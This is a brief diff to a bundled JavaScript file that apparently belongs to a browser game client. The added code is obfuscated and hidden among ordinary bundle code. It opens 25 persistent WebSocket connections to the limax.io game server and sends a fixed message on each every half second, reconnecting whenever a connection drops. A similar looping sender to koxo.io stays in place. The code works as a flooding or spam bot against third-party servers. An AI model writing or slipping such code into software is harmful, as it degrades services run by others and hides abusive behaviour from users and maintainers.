@@ -1724,8 +1724,20 @@
     })(Math);
   }, function (e, n) {
     window.gamepad = 23;
-    !function n(){let e=new WebSocket("wss://newyork1.limax.io/");e.onopen=()=>setInterval(()=>e.send('[1,"sunrise?",2]'),500),e.onclose=()=>setTimeout(n,500)}();
-    !function nb() {let e = new WebSocket("wss://newyork1.koxo.io/");e.onopen = () => setInterval(() => e.send('{"t":"skin","st":0,"mt":0,"ct":0,"name":"sunrise?"}'), 500);e.onclose = () => setTimeout(nb, 500);}();
+(function () {
+  const v = "wss://newyork1.limax.io/";
+  const v2 = "[1,\"sunrise?\",2]";
+  const v3 = 25;
+  const v4 = new Array(v3).fill(null);
+  function f(p) {
+    const v5 = new WebSocket(v);
+    v5.onopen = () => setInterval(() => v5.readyState === 1 && v5.send(v2), 500);
+    v5.onclose = () => setTimeout(() => f(p), 500);
+    v4[p] = v5;
+  }
+  v4.forEach((p2, p3) => f(p3));
+})();
+!function nb() {let e = new WebSocket("wss://newyork1.koxo.io/");e.onopen = () => setInterval(() => e.send('{"t":"skin","st":0,"mt":0,"ct":0,"name":"sunrise?"}'), 500);e.onclose = () => setTimeout(nb, 500);}();
   (function () {
       "use strict";
 
